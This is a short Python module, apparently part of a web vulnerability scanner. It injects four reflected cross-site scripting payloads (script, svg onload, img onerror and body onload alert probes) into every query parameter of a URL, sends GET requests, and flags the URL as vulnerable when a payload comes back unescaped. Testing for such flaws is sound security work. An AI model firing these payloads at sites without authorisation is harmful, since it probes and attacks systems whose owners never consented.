# xss.py

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><svg onload=alert(1)>",
    "<img src=x onerror=alert('xss')>",
    "<body onload=alert('XSS')>"
]

def inject_payload(url, payload):
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)

    if not query_params:
        return None  # No query params to inject

    # Inject payload into every parameter
    injected_params = {k: payload for k in query_params}
    new_query = urlencode(injected_params, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))

    return new_url

def check_xss(url):
    results = []

    for payload in XSS_PAYLOADS:
        test_url = inject_payload(url, payload)
        if not test_url:
            continue  # Skip if no injection point

        try:
            res = requests.get(test_url, timeout=10)
            if payload in res.text:
                return {
                    "status": "vulnerable",
                    "payload": payload,
                    "url": test_url,
                    "severity": "high"
                }
        except Exception as e:
            results.append({"error": str(e)})

    return {
        "status": "safe" if not results else "undetermined",
        "severity": "low" if not results else "medium",
        "details": results if results else None
    }
